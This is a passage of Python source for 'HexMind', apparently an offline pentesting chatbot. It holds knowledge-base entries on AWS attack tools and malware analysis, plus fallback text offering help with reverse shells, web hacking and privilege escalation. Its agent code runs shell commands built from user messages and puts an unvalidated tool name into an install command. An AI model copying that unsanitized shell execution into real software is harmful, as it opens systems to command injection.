- `cloudfox` — find attack paths in AWS
- `pacu` — AWS exploitation framework"""
    },
    "malware_analysis": {
        "kw": ["malware","reverse engineering","malware analysis","dynamic analysis","static analysis","sandbox","ghidra","ida"],
        "r": """**Malware Analysis:**

**Static analysis:**
```bash
file sample                # File type
strings sample | less      # Readable strings
ssdeep sample              # Fuzzy hash
pescan sample.exe          # PE info
objdump -d sample          # Disassemble
```

**Dynamic analysis (sandboxed!):**
- Run in VM with `FlareVM` or `REMnux`
- Network: `Wireshark` + `FakeNet-NG`
- Process: `Process Monitor` / `procmon`
- Registry: `Regshot`

**Reverse engineering:**
```bash
ghidra                     # Free, NSA decompiler
r2 sample                  # Radare2
cutter                     # GUI for radare2
```

**Online sandboxes:**
- VirusTotal | Any.Run | Hybrid Analysis | Joe Sandbox

**IOC extraction:** Check C2 domains, IPs, mutexes, file drops, registry changes."""
    },
}

FALLBACK = [
    "I'm in offline mode right now (type `settings` to connect API).\n\nAsk me about any of these and I'll give you a full breakdown:\n**Nmap** · **SQLi/XSS/web hacking** · **Metasploit** · **Burp Suite** · **Hydra** · **Linux/Windows privesc** · **Recon** · **Reverse shells** · **CTF** · **Hash cracking** · **Active Directory** · **Python scripting** · **Termux** · **Bug bounty**\n\nOr type `brain` to install local AI for smarter answers offline.",
    "Offline mode active. What tool or technique do you want to learn?\n\nI know everything about pentesting, CTF, web hacking, privesc, recon, scripting and more. Ask specifically and I'll give you a complete reference.",
]


class OfflineBrain:
    def __init__(self):
        self._offline    = False
        self._first_err  = True
        self._local_llm  = None

    def set_offline(self, v: bool):   self._offline = v
    def is_offline(self)  -> bool:    return self._offline

    def handle_api_error(self, err: str) -> str:
        self._offline = True
        msg = random.choice(API_MSGS) if self._first_err else \
              "Still in offline mode. Type `settings` to reconnect.\n\nWhat do you need? I'll answer from my local knowledge."
        self._first_err = False
        return msg

    # ── Local LLM (Tier 1) ────────────────────────────────────────────────────
    def _get_local_llm(self):
        if self._local_llm is None:
            from brain.local_llm import LocalLLM
            self._local_llm = LocalLLM()
        return self._local_llm

    def local_llm_ready(self) -> bool:
        try: return self._get_local_llm().is_ready()
        except Exception: return False

    def get_local_llm(self):
        return self._get_local_llm()

    # ── Agent ─────────────────────────────────────────────────────────────────
    def detect_agent_command(self, message: str):
        ml = message.lower().strip()
        for pattern, builder in AGENT:
            m = re.search(pattern, ml, re.IGNORECASE)
            if m:
                try:
                    cmd = builder(m) if callable(builder) else builder
                    return cmd, "running"
                except Exception:
                    continue
        return None, None

    def run_agent_command(self, cmd: str, label: str) -> str:
        if cmd.startswith("__WEB_SEARCH__ "):
            query = cmd.split("__WEB_SEARCH__ ", 1)[1]
            try:
                from modules.web_agent import search_duckduckgo
                res = search_duckduckgo(query)
                return f"🌐 **Web Search Results for:** `{query}`\n\n{res}"
            except ImportError:
                return "Web agent module not found."
                
        if cmd.startswith("__INSTALL_TOOL__ "):
            tool = cmd.split("__INSTALL_TOOL__ ", 1)[1]
            try:
                from modules.web_agent import search_github_repo
                repo = search_github_repo(tool)
                if not repo:
                    # Fallback to standard APT/PKG install if not on GitHub
                    out = _run(f"command -v pkg >/dev/null && pkg install -y {tool} || sudo apt install -y {tool}")
                    return f"🤖 `install {tool}`\n\n```\n{out}\n```"
                else:
                    return f"__ASK_AI_INSTALL__ {tool}"
            except ImportError:
                pass
                
        output = _run(cmd)
        return f"🤖 `{cmd}`\n\n```\n{output}\n```"

    # ── Main respond ──────────────────────────────────────────────────────────
    def respond(self, message: str, user: dict = None) -> str:
        ml   = message.lower().strip()
        name = (user or {}).get("name", "hacker")

        # Greetings
        if any(ml == g or ml.startswith(g+" ") for g in GREETINGS):
            return (f"Hey {name}! 👋 HexMind here — your AI hacking companion.\n\n"
                    f"Running offline right now. Type `settings` to connect cloud AI, "
                    f"or `brain` to install local AI.\n\n"
                    f"What do you need?") + BADGE_OFFLINE

        # Chitchat
        for triggers, fn in CHITCHAT.items():
            if any(t in ml for t in triggers):
                return fn(name) + BADGE_OFFLINE

        # Tier 1 — Local LLM
        if self.local_llm_ready():
            try:
                llm = self._get_local_llm()
                reply = llm.chat(message, user)
                
                # Check for explicit errors from Ollama connection
                if "error" in str(reply).lower() and ("connection refused" in str(reply).lower() or "not found" in str(reply).lower() or "timed out" in str(reply).lower()):
                    return f"❌ **Local AI Error:** {reply}\n\n*Tip: Start Ollama, check your downloaded models in the `brain` menu, or wait for the model to load.*" + BADGE_OFFLINE
                    
                if reply and len(reply) > 8:
                    model_display = llm.model_name()
                    dynamic_badge = f"\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🧠 Local AI ({model_display})  |  Type `settings` for cloud API"
                    return reply + dynamic_badge
            except Exception as e:
                return f"❌ **Local AI Exception:** {str(e)}\n\n*Tip: Start Ollama or check your setup using `brain` command.*" + BADGE_OFFLINE

        # Tier 2 — Knowledge base
        best, best_score = None, 0
        for topic, data in KB.items():
            score = sum(len(kw) for kw in data["kw"] if kw in ml)
            if score > best_score:
                best_score, best = score, data

        if best and best_score > 2:
            return best["r"] + BADGE_OFFLINE

        # Tier 3 — Fallback
        return random.choice(FALLBACK) + BADGE_OFFLINE
